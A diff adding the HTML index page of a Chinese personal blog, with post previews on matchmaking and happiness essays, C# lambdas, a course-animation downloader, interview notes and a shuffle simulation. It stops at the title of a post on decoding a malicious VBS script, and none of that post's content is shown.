@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>bystander&#39;s blog</title>
+  <meta property="og:title" content="bystander&#39;s blog" />
+  <meta name="twitter:title" content="bystander&#39;s blog" />
+  <meta name="author" content="bystander"/>
+  <link href='https://leizhiyuan.github.io/images/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta property="og:image" content="https://leizhiyuan.github.io/images/author.jpg" />
+  <meta name="twitter:image" content="https://leizhiyuan.github.io/images/author.jpg" />
+  <meta name="twitter:card" content="summary" />
+  <meta property="og:url" content="https://leizhiyuan.github.io/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="bystander&#39;s blog" />
+
+  <meta name="generator" content="Hugo 0.49.2" />
+  <link rel="canonical" href="https://leizhiyuan.github.io/" />
+  <link rel="alternate" href="https://leizhiyuan.github.io/index.xml" type="application/rss+xml" title="bystander&#39;s blog">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://leizhiyuan.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+  <link rel="stylesheet" href="https://leizhiyuan.github.io/css/highlight.min.css" /><link rel="stylesheet" href="https://leizhiyuan.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+</head>
+
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://leizhiyuan.github.io/">bystander&#39;s blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="首页" href="/">首页</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="目录" href="/categories">目录</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="标签" href="/tags">标签</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="关于我" href="/about/">关于我</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="bystander&#39;s blog" href="https://leizhiyuan.github.io/">
+            <img class="avatar-img" src="https://leizhiyuan.github.io/images/author.jpg" alt="bystander&#39;s blog" />
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="page-heading">
+              
+                <h1>bystander&#39;s blog</h1>
+              
+              
+                <hr class="small">
+              
+              
+                
+                  <span class="page-subheading">寻找窄门</span>
+                
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+  <div role="main" class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        
+
+        <div class="posts-list">
+          
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/12/10/%E4%BB%8E%E7%9B%B8%E4%BA%B2%E5%BB%B6%E4%BC%B8%E5%87%BA%E7%9A%84%E5%A9%9A%E6%81%8B%E6%84%8F%E4%B9%89/">
+                <h2 class="post-title">从相亲延伸出的婚恋意义</h2>
+                
+                
+              </a>
+
+              <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on December 10, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 1 minutes (12 words)
+  
+  
+</span>
+
+
+              <div class="post-entry">
+                
+                  <p>相亲现在挺火的。。</p>
+
+<p>文章来自<strong>xiuloveshow</strong></p>
+
+<p>老妈说：“妈希望你找个家庭条件好点儿的，以后少吃苦，别走老妈的路！”。老爸说：“老爸没别的要求，就希望你找个家庭和睦的，这样的家庭教育出来的子女各方面都不会差到哪儿去，家庭条件爸不是特别看重”。老哥说：”这么大个村儿就你一个单身了，小心被剩下！“。朋友说：”咋总是忙着给别人介绍，赶紧把自己推销出去再说！”我说：我想找个在我不开心的时候，什么都不用做，就静静的呆在我旁边，即使是看着我哭也好。</p>
+
+<p>三毛说：看得不顺眼的话，千万富翁也不嫁；看得中意，亿万富翁也嫁。张小娴说：你走，我不送你。你来，无论多大风多大雨，我都要去接你。史铁生说：爱情就是在追求喜欢和爱，这二者同时达到便是爱的理想状态，爱就是一种理想。我说：嫁与不嫁，送与不送，喜欢与爱，我只想用我自己的方式去做人生最重要的选择，这种东西没有参数值，用完一次便没有了！</p>
+
+<p>之前为凑热闹跟一老乡去相亲，相亲的目标性特别强，大家都冲着结婚去的，他们从来不会凭感觉去判断这个人是否是自己中意的人。对方开口便问月工资多少？家里买房没？而男方像是履行一项任务或是已经习惯了这样一套开场白，还未等女方开口，从爷爷的退休工资开始说到自己的工资水平。这其中我没有听到任何一句关于心理沟通的话题，全是围绕物质展开的激烈对白。我有点儿后悔跟她去了，这让我看到了现代人最“真实”的婚恋观，我有些后怕！</p>
+
+<p>后来，我问老乡对男方的印象怎么样。她毫无掩饰的说：“家庭条件还可以，人也挺老实，没更好的就成了“”你到底想找个什么样的？”因为我不确定她的方向，作为女性擅有的八卦心态，我还是忍不住问了。“没什么特别的要求，只要有房，工资还可以，父母不要我们负担就好了。至于感情可以慢慢培养的！”她的表情很轻松，像是在述说一件很平常的事。我有些失望，像是在风和日丽的宁静之夏突然袭来的狂风暴雨。</p>
+
+<p>我想如果是我，我不一定要多大的房，多高的工资。物质和精神两个层面，我永远把精神排第一。两个人每天围绕着柴米油盐酱醋茶，围绕着生活中的琐琐碎碎，内心的苦闷却苦于找不到人述说。彼此不懂对方的世界，不懂爱好为何物，不懂兴趣乃何价，这样的恋爱，这样的婚姻多么的恐怖。我不希望半夜醒来向着电台诉说悲伤，乞求听众收容我的眼泪！</p>
+
+<p>如史铁生所说，爱乃一种理想。即为理想凭努力不一定能达到。喜欢一个人和爱一个人是完全不同的两种境界，喜欢一个人，当激情用尽之时，就只有靠着那张印着两个人照片的结婚证来维持彼此的关系，这种关系完全靠法律来维系。爱一个人，当你生老病死，激情褪去之后依然想着跟你白头到老。这些恐怕是一张房产证换不来的细水长流般的幸福。关于物质和精神，关于爱和不爱。物质已经主导了我们的价值取向，我们不再自已。物质可以让人放弃精神随时转变自身角色，爱也会因为物质变得不爱了。</p>
+
+<p>我已经很久没有听到关于爱的序曲了。物质可以这样轻易的扭曲爱的意义，我们追求的幸福到底为何物？ 当年因物质放弃了最宝贵的东西，最稀有的精神支撑，当你得到了你所有物质的满足，物质填充了你的欲望，你能坦然的对自己说你很幸福？当你开着宝马，驾着良驹，住着豪宅，驱着游艇，是否我们就幸福了？</p>
+
+<p>我努力学习，认真工作，享受音乐，沉侵阅读，爱好写作，喜欢画画，偶尔给老爸老妈给好朋友煲电话粥！我不依赖任何人，我不向任何人屈服！面对机会我不放弃，面对感情拿得起放得下，面对亲情我感动无疑！喜欢倾听，喜欢跟人交往，喜欢跟老人交谈…。消费过后还有金钱结余，偶尔向文字倾吐心声。继续等待着那个可以说话的人出现。自创的理想也可以很诗意！</p>
+
+<p>我希望的婚恋观如同我的生活般平静，如果你能走进我的世界，如果你懂我的世界，我们可以无话不谈。但似乎这变成了一种奢侈，我们就是简单的无话可说！你在你的世界游历，我在我的世界漫步，踽踽独行有何不可！</p>
+
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%BF%83%E7%90%86/">心理</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E6%94%B6%E8%97%8F/">收藏</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E7%88%B1%E6%83%85/">爱情</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E7%94%9F%E6%B4%BB/">生活</a>&nbsp;
+                  
+                </div>
+              
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/12/08/3%E5%88%86%E9%92%9F%E7%90%86%E8%A7%A3lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
+                <h2 class="post-title">3分钟理解Lambda表达式</h2>
+                
+                
+              </a>
+
+              <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on December 8, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 1 minutes (50 words)
+  
+  
+</span>
+
+
+              <div class="post-entry">
+                
+                  <p><strong>1.什么是Lambda表达式</strong></p>
+
+<p>Lambda表达式是一个匿名方法，通常在LINQ中被用来创建委托</p>
+
+<p>简单来说。它是一个没有声明，没有访问修饰符，没有返回值。甚至没有名字的方法。</p>
+
+<p>&nbsp;</p>
+
+<p><strong>2.为什么我们需要使用Lambda表达式？或者说为什么我们要写一个没有名字的函数？</strong></p>
+
+<p>为了方便，这种快捷方式允许你在调用的地方直接编写代码，尤其是你想调用的代码只会在这个地方使用一次。并且方法体本身很短。节省了单独写方法中写声明等等的麻烦。。</p>
+
+<p>好处</p>
+
+<p>1.代码量减少。不必写方法的名称。返回值和访问修饰符</p>
+
+<p>2.当阅读代码的时候。直接就可以看到被调用函数的代码，不用去别的地方。</p>
+
+<p>Lambda表示应该短些。太复杂了。可读性就下降了</p>
+
+<p>&nbsp;</p>
+
+<p><strong>如果编写Lambda表达式</strong></p>
+
+<p>Lambda基本的定义是：参数=&gt;执行代码</p>
+
+<p>举个例子
+<pre lang="cs">n = &gt; n % 2 == 1</pre>
+n是输入参数
+n % 2 == 1 是函数体</p>
+
+<p>你可以读作：给这个匿名方法传入一个参数n，如果n是奇数就返回true</p>
+
+<p>&nbsp;</p>
+
+<p><strong>使用该Lambda的例子</strong>
+<pre class="lang:default decode:true">List&lt;int&gt; numbers = new List&lt;int&gt;{11,37,52};
+List&lt;int&gt; oddNumbers = numbers.where(n =&gt; n % 2 == 1).ToList();
+//现在oddNumbers 里面就是11和37了</pre>
+ok.基本的Lambda表达式就是这样了。</p>
+
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/windows/">windows</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E7%BF%BB%E8%AF%91/">翻译</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%AE%BE%E8%AE%A1/">设计</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%BD%AF%E4%BB%B6/">软件</a>&nbsp;
+                  
+                </div>
+              
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/12/05/%E4%BB%8E%E5%B9%B3%E5%BA%B8%E5%88%B0%E5%B9%B8%E7%A6%8F/">
+                <h2 class="post-title">从平庸到幸福</h2>
+                
+                
+              </a>
+
+              <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on December 5, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 1 minutes (8 words)
+  
+  
+</span>
+
+
+              <div class="post-entry">
+                
+                  <p>一篇来自左岸的文章，可以读一读。只是不知道有几人能够认认真真读完。文予有缘人。随意吧。</p>
+
+<p><strong>作者：<a href="http://www.zreading.cn/archives/3030.html">文刀</a></strong></p>
+
+<p>当一件事情刚开始时，我们总会偏向于好的预期，因为这样我们才会去行动。当事情在不断的进展时，外界的因素（客观条件）总会引起我们主观上的波动，时而信心满满，时而跌入谷底。然而事情总是要有个结果的，在这样一种偏向反复，时好时坏的自我预期中，有些人选择了放弃，有些了继续了坚持。放弃，或许是因为有更明智的选择，又或许已经没戏了。坚持，或许是因为没有了退路，又或许是总体偏向于好的预期。不管怎么样，预期总会无穷的趋于向现实要一个结果。而关于结果是正无穷还是负无穷，我们却无法量化，因为做每一个选择，特别是人生选择时，其机会成本（选择成本）是无法量化的。读三年研与先工作三年是难以在同一个人身上同时进行，是不可逆的单一选择，也就无法真正理性地去决定。而我们之所以能够去决定，大部分取决于我们自己与身边人的偏好。所幸，我们都能也都应该看到，做如此的选择并没有犯下方向上的错误。总体上这条路上，我们的步伐是朝前迈的。我们的学识，我们的视野都在增进，然而，要问我们是否就此告别了平庸，是否走向了幸福与快乐，这却是无关的。</p>
+
+<p>知识的增长并不意味着个人道德水平的提高或是人个涵养的提升。在物欲横流的社会中，总能听到那么多关于知识分子的道德丑闻与民工的善行。平庸并不是表明人的身份，而是表明个人的如何从众。所以，对于钱权与名利的追求，恰恰是平庸之举。再看看幸福，知识的提高会带来更高的视野，也可能会导致更多的欲求。有限理性的欲求会是生活源源不断的动力，带来的实现会成为幸福的体验。纵然如此，这也只是一时的，更多的幸福并不在于我们要不断去满足，而是要学会去知足，学会去感激，去给予。所以，幸福是一种认知状态，是一种心境。</p>
+
+<p>再来设想一下，当我们把梦想比作一种财富的实现，我们就会发现。当一阶段内的目标实现了，我们就会寻找下一阶段的目标，然后再去实现它。这样的生活是富有挑战与方向感的，也就是有意义的，这种不断的自在追求本身会是幸福的。如此，追求财富就如梦想一般无可厚非（可能财富就是梦想），但如果我们无法认清财富存在的更多效用，我们就免不了坠入平庸，欲壑难填，我们又何来幸福。一千万在当下社会足以自在一把，然而却已然超出了本身的欲求（理性的），那么就应该拿出钱来做好事，给予会让自己更为幸福，因为我们可以就此看到更多幸福的存在。</p>
+
+<p>即使把幸福看作是一种认知状态，一种心境，但其也应该是我们毕生的追求。以前，我们生活无忧无虑，饭来张口衣来伸手，但我们都明白，那也只是一时的，是建立在亲人的血汗之上的。如今，我们走出校园，参加工作，就要懂得去承担相应的去给予身边人力所能及的照顾。从接受到享受再到给予最终还是到享受，这一过程就是认知状态的提升，就是对幸福的追求。幸福是学会接受与学会给予的过程。心境是个什么概念，又要如何提升呢？我们都清楚，在现世中不存在世外桃源，田园牧歌也不太现实。那么，我们就要学会把这种不可能变成可能带到生活中，其唯一的途径就是提升我们的心境。而这并不是说，我们要在现实生活中学会自欺欺人，而是把这样一份浪漫主义的情怀赋予到真实中，做到真、性、情。对于生活中的真真假假，我们要学会看到，看透，看淡；对于生活中的点点滴滴，我们要学会感激，感怀，感悟；还有对于他人，对于自己，也要力求做到真与善，从而现实幸福的美感。如此，心境的提高是一个领悟与缓慢提升的过程。幸福是一生的追求。</p>
+
+<p>当我们意识到追求梦想更深的是在追求幸福时，我们又深深的坚信着幸福是一种心境，那我们何不学会像相信幸福总是存在一样去相信梦想会实现呢，我们又何必多去假定另一种不好的预期存在呢。既然我们已经走在路上了，在正确追求幸福的路上呢，那我们何不去幸福呢 ？相对于冷漠的大众，我深信，时时能感到幸福，时时有梦想，为断去追求幸福的人，注定是个不平庸的人。</p>
+
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%BF%83%E7%90%86/">心理</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E6%94%B6%E8%97%8F/">收藏</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E6%9D%82%E6%96%87/">杂文</a>&nbsp;
+                  
+                </div>
+              
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/12/03/%E6%BA%90%E7%A0%81%E6%89%93%E5%8C%85%E4%B8%8B%E8%BD%BD%E7%AE%97%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%BC%94%E7%A4%BA%E5%8A%A8%E7%94%BB/">
+                <h2 class="post-title">[源码]打包下载算法与数据结构演示动画</h2>
+                
+                
+              </a>
+
+              <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on December 3, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 2 minutes (214 words)
+  
+  
+</span>
+
+
+              <div class="post-entry">
+                
+                  很早的时候，学习数据结构的时候。收集了一下演示的动画。帮助理解。但是不全。今天在看KMP算法的时候。看到了福州大学的一个精品课程。。81个演示动画呢。。想打包下载收藏。话说福州大学这才是好样的。踏踏实实搞学术。
+第一种方法就是手工了。。嘎嘎。你敢么。一个个下载。。。一个个改名。。
+第二种就是用整站下载的软件了。。但是我看了一下swf的命名。我就知道下载下来意义不大。因为名字不好理解。
+第三种就是自己写个程序吧。。
+&nbsp;
+整体思路，首先访问课程页面，解析得到每一章的标题和内容，然后创立章节文件夹，得到每个动画对应的html页面，然后对html页面解析，提取swf地址。然后下载就行了。
+比较疼的地方是那个页面用的是gb2312编码。而解析神器HtmlAgilityPack，不能指定编码。只能想办法绕过了。 WebClient client = new WebClient(); MemoryStream ms = new MemoryStream(client.DownloadData(url)); HtmlDocument doc = new HtmlDocument(); doc.Load(ms, Encoding.GetEncoding(&ldquo;gb2312&rdquo;)); 绕过方法就是先使用内置类得到内存流。然后从内存中加载。
+然后呢。涉及的技术就是xpath了。参考着xpath的文档。搞定了不少。中间还有一个地方就是我没注意看。这个页面有两个文件是一样名字。。调试了几次才发现。。 using System; using System.Collections.Generic; using System.Linq; using System.Text; using HtmlAgilityPack; using System.IO; using System.Threading; using System.Net;
+namespace FzuSwf { class Program { static void Main(string[] args) { DoWork(); }
+//执行任务 static void DoWork() { HtmlWeb web = new HtmlWeb(); HtmlDocument doc = web.Load(&#34;http://ds.fzu.edu.cn/fine/resources/&#34;); HtmlNode divResource = doc.
+                  <a href="https://leizhiyuan.github.io/2012/12/03/%E6%BA%90%E7%A0%81%E6%89%93%E5%8C%85%E4%B8%8B%E8%BD%BD%E7%AE%97%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%BC%94%E7%A4%BA%E5%8A%A8%E7%94%BB/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%A4%A7%E5%AD%A6/">大学</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%AD%A6%E4%B9%A0/">学习</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/">数据挖掘</a>&nbsp;
+                  
+                </div>
+              
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/11/28/c#%E4%B8%8E.net-%E7%A8%8B%E5%BA%8F%E5%91%98%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0/">
+                <h2 class="post-title">C#与.net 程序员面试笔记</h2>
+                
+                
+              </a>
+
+              <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on November 28, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 1 minutes (70 words)
+  
+  
+</span>
+
+
+              <div class="post-entry">
+                
+                  这是前几天读的书。书不难。10-13章跳过了。以后再看。
+以前，一个应用程序对应一个进程。并且为该进程指定虚拟内存，这样。进程会消耗很多资源，而且进程之间的通信业比较麻烦
+应用程序域可以理解为很多应用程序域都可以运行在同一个.net 进程中，降低内存消耗。同时不同的域之间隔离。安全有保证。通信也简单。
+程序集是指包含编译好的。面向.net framework的代码的逻辑单元。是完全自我描述性的一个逻辑单元。可以存储在多个文件中。简单来说，程序集就是几个彼此有关联程序文件的集合。程序集会包含程序的元数据。描述了对应代码中定义的方法和类型。
+装箱和拆箱：装箱转换是将一个值类型显式或隐式的转换成一个object对象。并且把这个对象转换成一个被该值类型应用的的接口类型。装箱后的object对象中的数据位于堆中。一般应该避免这种运算。 CLR将值类型的数据包裹到匿名的托管对象中，并将托管对象的引用放在Object类型的变量中。这个过程称为装箱。一般还是使用泛型来代替多好。
+值类型和引用类型：值类型实例通常分配在线程的栈上。并且不包含指向任何实例数据的指针。引用类型实例分配在托管堆上。变量保存了实例数据的内存引用。引用类型复制的话会导致引用同一个内存地址。
+C#预处理指令是在编译时调用的。预处理指令通知C#编译器要编译哪些代码。并指出如何处理特定的错误和异常。比如用在一些调试的时候。在顶部define一个debug 内部的测试部分写上测试用例。具体示例 //定义条件变量，注意条件变量的定义要在代码的最前面 #define Debug using System; namespace MyConsole { class Preprocesor { public static void Main() { //如果条件变量是Debug则运行单元调试代码，再运行功能模块返回运行结果 #if Debug Console.WriteLine(&ldquo;运行单元测试模块&rdquo;); Console.WriteLine(&ldquo;运行功能模块，返回输出结果&rdquo;); Console.Read(); #elif Release //如果条件变量是Release，则直接运行功能模块返回运行结果 Console.WriteLine(&ldquo;运行功能模块，返回输出结果&rdquo;); Console.Read(); #endif } } } C#中的指针 指针是一个无符号整数。是以当前系统寻址范围为取值范围的整数，CLR支持三种指针类型：受托管指针，非托管指针，非托管函数指针，受托管指针存储在堆上的托管块的引用，一个非托管指针就是传统意义上的指针，要放在unsafe中使用，C#中指针并不继承自Object
+String 是CLR的类型名称。而string是C#的关键字。其实C#编译时。。会增下如下代码： using string=System.String
+Array 到ArrayList的转换 1.使用ArrayList.Adapter(ArrayName) 可以直接得到ArrayList 2.使用遍历逐个添加到ArrayList里。 反向的话直接使用(Array[])ArrayListName.ToArray(typeof(Array));即可
+checked和unchecked语句用于控制整形算术运算和显示转换的溢出检查上下文。checked关键字用于对整型算术运算和转换显式启用溢出检查。因为默认情况下。如果表达式产生的值超过了类型的范围。则常数表达式将会导致编译时错误。而非常数表达式则在运行时计算并将引发异常。
+Asp.Net 中的Request对象主要功能是从客户端得到数据信息。他的属性比较多。比如UserLanguage，TotalBytes，Path，ApplicationPath
+ViewState是其的一个重要特性。用于把生成页面要用的状态值保存到一个隐藏域里。而不是用cookie/内存
+SOAP是Web Service应用的基础协议。他是一种轻量的简单的。基于xml的协议。被设计成在wEb上交换结构化的和固有的信息。 WSDL是一种用于描述web服务和说明如何与Web服务通信的XML语言。WSDL是一种符合XML语法规范的语言。它的设计完全基于Soap协议的实现。当一个WEb Service 服务器期望为使用者提供服务说明时，WSDL语言是最好的选择之一。
+&nbsp;
+对企业的一些认识 
+千万不要说自己未来的打算是做到管理层，首先对管理层的定义不清楚。职务不清楚。所以保险的答案是我会努力钻研技术。使得能够达到业内的专业人士。深刻理解公司和行业
+我是为了找一份长期性的工作。我不喜欢频繁的跳槽我希望在这个利于发展自己的事业。深入学习。向专业人士请教。那。该我想问这个职务是长期的吗？
+不要把公司想像成慈善机构。工作的运作方面应该是尽可能快的实现盈利。树立品牌，赢得客户。我的工作就是完成企业的良性运作。
+如果被问到是否需要考虑看分数。应该说用人单位确实需要全面考量。也要考虑应聘者的工作积极性/服从性。实际经验/对开发的理解诶。这些也许比分数更有价值。
+                  <a href="https://leizhiyuan.github.io/2012/11/28/c#%E4%B8%8E.net-%E7%A8%8B%E5%BA%8F%E5%91%98%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%A4%A7%E5%AD%A6/">大学</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%BC%80%E5%8F%91/">开发</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E6%80%BB%E7%BB%93/">总结</a>&nbsp;
+                  
+                </div>
+              
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/11/25/c#%E6%A8%A1%E6%8B%9F%E6%89%8B%E5%B7%A5%E6%B4%97%E7%89%8C%E9%99%84%E6%B5%8B%E8%AF%95/">
+                <h2 class="post-title">C#模拟手工洗牌(附测试)</h2>
+                
+                
+              </a>
+
+              <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on November 25, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 2 minutes (240 words)
+  
+  
+</span>
+
+
+              <div class="post-entry">
+                
+                  洗牌大家都知道，代码实现最广泛的一种就是产生两个随机数，然后交换这两个随机数为下标的牌，但是这种的洗牌并不能保证同概率，你可以参考本文做一些测试，本文代码没啥可说的。我写出了非常详细的注释
+ps:刚开始写那个随机数的时候，我随便给了个种子2012.。结果你懂的。。意外意外。这个全局的result数组让我很疼，代码有什么可以改进的，欢迎留言指出。不胜感激。 /*Author:Bystander *Blog:http://leaver.me Date:2012/11/24/ using System;
+class Program { static int[,] result; static void Main() { //初始牌的顺序，我只测试10张牌的情况 char[] _arr = { &lsquo;A&rsquo;, &lsquo;B&rsquo;, &lsquo;C&rsquo;, &rsquo;D&rsquo;, &lsquo;E&rsquo;, &lsquo;F&rsquo;, &lsquo;G&rsquo;, &lsquo;H&rsquo;, &lsquo;I&rsquo;, &lsquo;J&rsquo; }; result = new int[_arr.Length, _arr.Length]; //进行1000次，来统计结果的数字.
+for (int i = 0; i &amp;lt; 10000; i++) { ShuffleArray_Manual(_arr); SumCount(_arr); } int j = 0; foreach (int i in result) { if (j % result.GetLength(1) == 0) { Console.WriteLine(); } Console.
+                  <a href="https://leizhiyuan.github.io/2012/11/25/c#%E6%A8%A1%E6%8B%9F%E6%89%8B%E5%B7%A5%E6%B4%97%E7%89%8C%E9%99%84%E6%B5%8B%E8%AF%95/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/windows/">windows</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%AD%A6%E4%B9%A0/">学习</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E6%80%BB%E7%BB%93/">总结</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%AE%BE%E8%AE%A1/">设计</a>&nbsp;
+                  
+                </div>
+              
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/11/25/%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8Fvbs%E8%84%9A%E6%9C%AC%E7%9A%84%E7%AE%80%E5%8D%95%E8%A7%A3%E7%A0%81/">
+                <h2 class="post-title">一个恶意vbs脚本的简单解码</h2>
+                
+                
+              </a>
+
